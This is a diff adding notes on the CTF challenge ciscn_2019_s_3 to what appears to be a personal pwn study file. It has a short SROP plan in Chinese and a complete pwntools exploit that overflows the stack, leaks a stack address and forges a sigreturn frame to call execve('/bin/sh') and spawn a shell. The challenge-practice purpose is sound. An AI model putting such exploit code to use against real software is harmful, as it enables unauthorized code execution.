@@ -320,3 +320,64 @@ for i in {0..9} {a..f};do
 done
 ```
 
+#### ciscn_2019_s_3  SROP ret2csu
+
+* SROP解法
+  * read在栈上写入 /bin/sh（也可以在bss段写入，这样反而无需泄露栈地址）
+  * read溢覆盖返回地址到read，为第二次payload做准备
+  * write泄露栈地址
+  * ret到read后再次输入payload
+  * 覆盖返回地址跳转到gadgets，设置rax
+  * 覆盖gadgets()的返回地址指向syscall
+  * 伪造sigframe
+
+```python
+from pwn import *
+
+context(log_level='debug',arch='amd64', os='linux')
+elfpath = '/home/lideao/C/ciscn_s_3'
+context.binary = elfpath
+context.terminal = ['tmux', 'splitw', '-h']
+io=process()
+elf = ELF(elfpath)
+# io=gdb.debug(elfpath,'''
+#     b main
+#     b *0x400519
+#     c
+# ''')
+
+
+write_addr = 0x4004f1
+payload1 = flat(
+    {0x00:b'/bin/sh\x00',
+    ( 0x7fffffffe380-0x7fffffffe370) : write_addr}
+)
+io.send(payload1)
+recv=io.recv()[32:40]
+print(b"addr:"+recv)
+stack_addr = u64(recv)
+bin_sh_addr = stack_addr - 0x128
+
+gadget_addr = 0x00000000004004DA
+syscall = 0x400501
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_execve
+sigframe.rdi = bin_sh_addr
+sigframe.rsi = 0x0
+sigframe.rdx = 0x0
+sigframe.rip = syscall
+
+payload2 = flat(
+    {0x10:gadget_addr,0x18:syscall},
+    bytes(sigframe)
+)
+pause()
+io.send(payload2)
+io.interactive()
+
+
+```
+
+
+
+ 
